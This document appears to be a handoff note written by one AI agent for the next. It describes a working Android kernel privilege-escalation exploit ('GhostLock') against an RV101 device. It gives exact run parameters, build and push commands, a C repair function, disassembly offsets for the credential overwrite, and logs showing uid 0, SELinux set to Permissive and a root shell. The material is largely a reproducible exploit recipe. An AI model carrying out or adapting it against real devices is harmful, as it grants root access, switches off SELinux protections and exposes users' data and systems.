# GhostLock RV101 — Work Status Handoff v12 (twelfth agent: W2 uid=0 achieved + reproducible)

> 中文版：[GHOSTLOCK_HANDOFF_V12.md](GHOSTLOCK_HANDOFF_V12.md)

> Updated 2026-08-22. This round (the twelfth agent) completed on the real device (<DEVICE_SERIAL>):
> **1. W2 credential overwrite succeeded: child uid = 0, and it is reproducible (this agent 2/2 + a parallel agent 1/1).**
> **2. Settled that the current `do_cred_write()` uses mode-5 (Strategy 1), and proved its correctness by tracing rb_erase instruction by instruction.**
> **3. Settled that the only variable in W2 failure is boot health (nr_threads), not the write logic.**
> **4. Recorded mode-5's gid side effect (init_cred->gid is blown up by write#1), and gave a precise repair path.**

---

## 0. The most critical conclusion (read first)

> **【W2 achieved: child uid = 0, reproducible】**
> Complete evidence from three clean boots (`reports/ghostlock_runlogs/`):
> - `run_w2boot2_v957_124547.log` (this agent, second boot, slide=0x27dc400000):
>   `install_fake_fops_v2 DIAG: write#1 LANDED (vehicle 115)` →
>   `round 1/1: child=9075 prev=0xffffff80265c04c8 stable=1 task=0xffffff80265c0000` →
>   `child uid = 0 (0x00000000)` → `[+] child is root!` → `Permissive` →
>   `[T+367850ms] exploit complete — root shell spawned`.
> - `run_w2boot3_v957_125327.log` (this agent, third boot, slide=0x14be600000): attempt 1 MISSED,
>   attempt 2 `write#1 LANDED (vehicle 264)` → `child uid = 0 (0x00000000)` → `Permissive`.
> - `run_r26_v958_124120.log` (parallel agent, first boot, slide=0x1797800000):
>   `child uid = 0 (0x00000000)` → `uid=0(root) gid=483095800(...) context=u:r:kernel:s0` → `Permissive`.
>
> All three produced a root-owned file `-rwxr-xr-x 1 root ... /data/local/tmp/su_gl` (proof of root write capability),
> and `getenforce` returned `Permissive` (SELinux off). **This satisfies the handoff's "Full success"**
> (uid=0 reproducible on a healthy boot, with logs, root path with no heap read).

> **【Current strategy settled = mode-5 (Strategy 1), not mode-2 / v9.56 repair】**
> `do_cred_write()` in `src/main.c`:
> ```c
> set_pselect_write_mode(data_addr(INIT_CRED) + 8, target, 5);
> ```
> After tracing `rb_erase` instruction by instruction (`research/ghostlock_refs/rv101_disasm/rb_erase.txt`), mode-5's
> forged waiter (tree_entry.parent_color=init_cred, right=target, left=0) takes the **0x774b8c branch**
> (rb_left==NULL), producing two writes:
> - **WRITE#2 (0x774d84 `str x9,[x8]`)**: `*(target) = init_cred` → `task->cred = init_cred`. ✅
> - **WRITE#1 (0x774bac `str x8,[x11]`)**: `*(init_cred+8) = target` → blows up `init_cred->gid@0x08`
>   and `suid@0x0c`, **but uid@0x04 is unchanged** (`usage` is a 4-byte `atomic_t`, uid is at +0x04, settled in V11).
>
> `getuid()` reads `[cred+0x04]` = `init_cred->uid = 0`, hence child uid=0. **Three on-device measurements consistently confirm this.**

---

## 1. The real state at the start of this round (What was true at the start)

- Device: `getenforce=Enforcing` (fresh boot), `loadavg ... 1/1306` (nr_threads=1306 < 3000).
- Device binary sha1 = local build sha1 = `2850496c18dc3ca5fa9340896d2110ef216e030e` (identical).
- `do_cred_write()` in `src/main.c` was already **mode-5** (`data_addr(INIT_CRED)+8, target, 5`),
  and its comment already explained mode-2's uid clobber root cause. **The v9.56 repair (mode-4 write_value=0) was not yet implemented.**
- Version markers: source has v9.50/v9.51/v9.54/v9.55, **no v9.52/v9.56**. build mtime 12:30:14,
  main.c mtime 12:30:01 (ready before this agent started; this agent did not change the source).
- A parallel agent was active at the start (see §7).

## 2. What changed this round (What changed in source/build)

- **source/build: no changes at all**. The mtimes of `src/*.c`, `target_rv101.h`, and `build/ghostlock_rv101`
  did not change during this agent's tenure; the device binary sha1 stayed at `2850496c…` throughout.
- Added one run-log wrapper script `scripts/ghostlock_run.sh` (records uptime/loadavg/sha1/env/full
  stdout+stderr/reboot detection); all three tests this round used it to save logs.

## 3. What tests ran (What tests ran)

| # | Command (on-device) | boot | Result |
|---|---|---|---|
| 1 | `GL_PURGE_CNT=0 GL_TAIL_KILLS=16 GL_DUMMY_KILLS=0 GL_SETUP_ATTEMPTS=1 … --selftest` | boot1 @305s | mm-leak `Threads:4097`, reclaim `dip=1`, `SELFTEST 1/1 STRICT` ✅ |
| 2 | `GL_PURGE_CNT=0 GL_TAIL_KILLS=16 GL_DUMMY_KILLS=0 W2_ATTEMPTS=1 …` | boot1 @444s | ❌ FOPS install 6× MISSED (boot already degraded: loadavg `52/7829`, mm-leak EAGAIN or reclaim dip=0) |
| 3 | same as above | boot2 @263s | ✅ **uid=0** (FOPS LANDED veh 115, child uid=0, Permissive) |
| 4 | same as above | boot3 @215s | ✅ **uid=0** (attempt1 MISSED, attempt2 LANDED veh 264, child uid=0, Permissive) |

## 4. Logs produced (Logs produced)

- `reports/ghostlock_runlogs/run_selftest_v957_123538.log` — reclaim health pre-check (STRICT hit).
- `reports/ghostlock_runlogs/run_w2_v957_123757.log` — failure sample under degraded boot1 (for comparison).
- `reports/ghostlock_runlogs/run_w2boot2_v957_124547.log` — **W2 uid=0 success #1**.
- `reports/ghostlock_runlogs/run_w2boot3_v957_125327.log` — **W2 uid=0 success #2 (reproducible)**.
- (parallel agent) `reports/ghostlock_runlogs/run_r26_v958_124120.log` — W2 uid=0 success #3.

## 5. What is now proven (What is now proven)

1. **W2 uid=0 achieved and reproducible** (this agent 2/2, plus the parallel agent 1/1). Evidence:
   `run_w2boot2 … "child uid = 0 (0x00000000)"`, `run_w2boot3 … "child uid = 0 (0x00000000)"`,
   `run_r26_v958 … "uid=0(root) … context=u:r:kernel:s0"`.
2. **mode-5 is the correct W2 write strategy**: WRITE#2 writes init_cred into `task->cred` (twice, cred/real_cred),
   WRITE#1 only blows up init_cred->gid/suid and does not touch uid. Runtime evidence and the disassembly trace agree exactly.
3. **The only variable in W2 failure is boot health (nr_threads)**, not the write logic. Comparison:
   - good boot (nr_threads≈1290-1310): mm-leak `dummy clones ok=450 fail=0`, `Threads:4097`,
     FOPS `write#1 LANDED`, uid=0.
   - bad boot (boot1 @444s, loadavg 4th field `52/7829`): mm-leak EAGAIN or reclaim `dip=0`,
     `o2 68->1836` (order-2 churn buries the leak slab).
   - This agent's success timings: **~215s, ~263s, ~396s after boot** (success), failure at ~444s. Earlier than V11's
     "~396-397s" also works; **the key is nr_threads < 3000 and a low loadavg runnable count**.
4. **The root path has no heap read**: task location uses `init_task.tasks.prev` (a kernel-image static address,
   configfs read `r=8`), and the cred write uses mode-5 (a heap write through rb_erase, not via copy_to_user).
   `walk_tasks()`/`find_task_by_tgid()` were not called.
5. **W1 semantics unchanged**: mode-5's FOPS install (`install_fake_fops_v2`) writes the global `ashmem_misc.fops`,
   unrelated to W1's selinux_state write path; there is no regression.

## 6. What remains blocked / next refinements

1. **gid is a garbage value (a known mode-5 side effect, not a blocker)**: `id` shows `uid=0 gid=<low 32 bits of the task pointer>`.
   The three successes each differ (643565432 / 1914065016 / 483095800). Root functionality is unaffected (SELinux off,
   root file writes, shell starts) but `id -g` is not 0. **The repair path is already written (see §7 command 3)**: after the two
   `do_cred_write()` calls, add one mode-4 `write_value=0` write to `init_cred+0x08` to zero gid+suid
   (write#2 is skipped by the `cbnz` because value=0, which is safe). **Not yet implemented/measured.**
2. **Boot health is the only flake**: `cat /proc/loadavg` must be checked before running, and only run when
   nr_threads < 3000; reboot directly if >5000. FOPS install attempt 1 may still MISS (`run_w2boot3` attempt1 MISSED →
   attempt2 LANDED); this is a flake in reclaim's SKB head-grab, and retrying is itself correct (V10 Appendix F).
3. **Parallel agent coordination**: another agent was observed running during this round (`run_r26_v958`), and the two sharing the
   same device pollute each other's boot (reclaim/memfd pin accumulation). The next agent should first confirm no other agent is running, or coordinate a single executor.

## 7. Exact next commands (Exact next commands)

First check the device and boot health:
```bash
ADB="/mnt/c/Users/<USER>/AppData/Local/Android/Sdk/platform-tools/adb.exe"; S="<DEVICE_SERIAL>"
"$ADB" -s $S shell cat /proc/loadavg     # the 4th field total must be < 3000
"$ADB" -s $S shell getenforce
"$ADB" -s $S shell sha1sum /data/local/tmp/ghostlock_rv101   # must = 2850496c18dc3ca5fa9340896d2110ef216e030e
```
Command 1 — reproduce W2 uid=0 (**run only when nr_threads < 3000**, otherwise `"$ADB" -s $S reboot` and start over):
```bash
cd /mnt/c/Users/<USER>/Documents/codebase/rokid_root
./scripts/ghostlock_run.sh w2 v957 \
  "GL_PURGE_CNT=0 GL_TAIL_KILLS=16 GL_DUMMY_KILLS=0 W2_ATTEMPTS=1 /data/local/tmp/ghostlock_rv101"
# success criterion: "child uid = 0 (0x00000000)" and "child is root!" appear in the log
```
Command 2 — rebuild/push (when the source has been changed; NDK path as in V11):
```bash
cd /mnt/c/Users/<USER>/Documents/codebase/rokid_root/source_code/ghostlock_rv101
NDKBIN="/mnt/c/Users/<USER>/AppData/Local/Android/Sdk/ndk/android-ndk-r27d/toolchains/llvm/prebuilt/windows-x86_64/bin"
"$NDKBIN/clang.exe" --target=aarch64-linux-android31 -O2 -Wall -Wextra \
  -Wno-unused-parameter -Wno-sign-compare -fno-stack-protector -fPIE -Isrc \
  -include target_rv101.h -o build/ghostlock_rv101 src/main.c src/util.c src/route.c \
  -pie -static-libgcc -pthread
ADB="/mnt/c/Users/<USER>/AppData/Local/Android/Sdk/platform-tools/adb.exe"
"$ADB" -s <DEVICE_SERIAL> push build/ghostlock_rv101 /data/local/tmp/ghostlock_rv101
"$ADB" -s <DEVICE_SERIAL> shell "chmod 755 /data/local/tmp/ghostlock_rv101"
```
Command 3 — gid repair (so that root's `id -g` also returns 0; add one call inside `src/main.c`'s W2 round,
after `do_cred_write(task + TASK_REAL_CRED_OFF);`):
```c
static int do_gid_repair(void) {          // add to main.c and call after do_cred_write(real_cred)
  page_base = prepare_good_kernel_page();
  if (!page_base) return 0;
  pselect_child_node = 1;
  set_pselect_write_mode(data_addr(INIT_CRED) + 8, 0, 4);  // mode-4, write_value=0
  run_main_route_threads();                                 // WRITE#1: init_cred+8=0 (gid+suid)
  clear_pselect_write();                                    // WRITE#2 skipped by cbnz
  cleanup_page_prepare_state();
  return 1;
}
```
(Theory: mode-4's tree_pc=`(init_cred+8-8)|1`=`init_cred|1`, right=0, left=0 → the rb_erase
0x774b8c branch does `str x8(=0),[init_cred+8]` zeroing gid+suid; `cbnz x8` skips write#2.)

## 8. Dangerous assumptions disproven (Dangerous assumptions disproven)

1. **"child uid=-128 means the task pointer is wrong / the write did not land"** — wrong. V11's -128 was mode-2's
   write#2 blowing up uid; after switching to mode-5 the uid is 0, proving the write does land and the task pointer (`prev-TASK_TASKS_OFF`) is correct.
2. **"W2 can only succeed at ~396-397s uptime"** — inaccurate. This agent also succeeded at **215s / 263s**;
   the real variable is nr_threads < 3000 (consistent with V11's nr_threads gate), and uptime is only correlated, not causal.
3. **"Once the mode-5 FOPS install MISSES it must be rebooted and cannot be retried"** — overly conservative. In `run_w2boot3`
   attempt1 MISSED → attempt2 LANDED still gave uid=0; mode-5's write#2 pollutes fops each time, but
   the next attempt overwrites it, so retrying is itself safe (provided the boot is still healthy and nr_threads is low).

## Appendix A: Key log excerpts from the successful runs

`run_w2boot2_v957_124547.log`:
```
[+] KASLR: slide=0x00000027dc400000 base=0xffffffe7e4400000 (2 anchors)
[*] install_fake_fops_v2 DIAG: write#1 LANDED (vehicle 115, llseek=0xffffffe7e6dbcbc0 exp=0xffffffe7e6dbcbc0)
[*] configfs probe: init_task.tasks.next = 0xffffff8001037248
[*] round 1/1: child=9075 prev=0xffffff80265c04c8 prev2=0xffffff80265c04c8 stable=1 task=0xffffff80265c0000
[*]   cred_slot=0xffffff80265c0780 real_cred_slot=0xffffff80265c0778 init_cred=0xffffffe7e6602058
[*] child uid = 0 (0x00000000)
[+] child is root!
[+] GHOSTLOCK ROOT: uid=0 gid=
Permissive
[*] [T+367850ms] exploit complete — root shell spawned via /data/local/tmp/.ghostlock_root.sh
--- getenforce after ---
Permissive
--- su_gl ---
-rwxr-xr-x 1 root u4830_i5800 60128 2026-08-22 12:47 /data/local/tmp/su_gl
```

`run_w2boot3_v957_125327.log` (reproducible, attempt2 LANDED):
```
[+] KASLR: slide=0x00000014be600000 base=0xffffffd4c6600000 (2 anchors)
[*] install_fake_fops_v2 DIAG: write#1 MISSED (vehicle -1, ...)     # attempt 1
[*] install_fake_fops_v2 DIAG: write#1 LANDED (vehicle 264, ...)    # attempt 2
[*] round 1/1: child=14504 prev=0xffffff8072164dc8 prev2=0xffffff8072164dc8 stable=1 task=0xffffff8072164900
[*] child uid = 0 (0x00000000)
[+] child is root!
Permissive
[*] [T+303323ms] exploit complete — root shell spawned
```

## Appendix B: This agent's timeline (including the parallel agent)

| Time | boot | Event |
|---|---|---|
| 12:32 | boot1 | start, nr_threads=1306 |
| 12:35 | boot1 @305s | selftest STRICT ✅ |
| 12:37-12:41 | boot1 @444s | this agent's W2 ❌ (boot degraded nr_threads=7829) |
| 12:41-12:42 | boot1 @396-551s | parallel agent run_r26_v958 uid=0 ✅ |
| 12:43 | — | this agent reboot |
| 12:45-12:47 | boot2 @263s | this agent W2 uid=0 ✅ |
| 12:52 | — | this agent reboot |
| 12:53-12:56 | boot3 @215s | this agent W2 uid=0 ✅ |
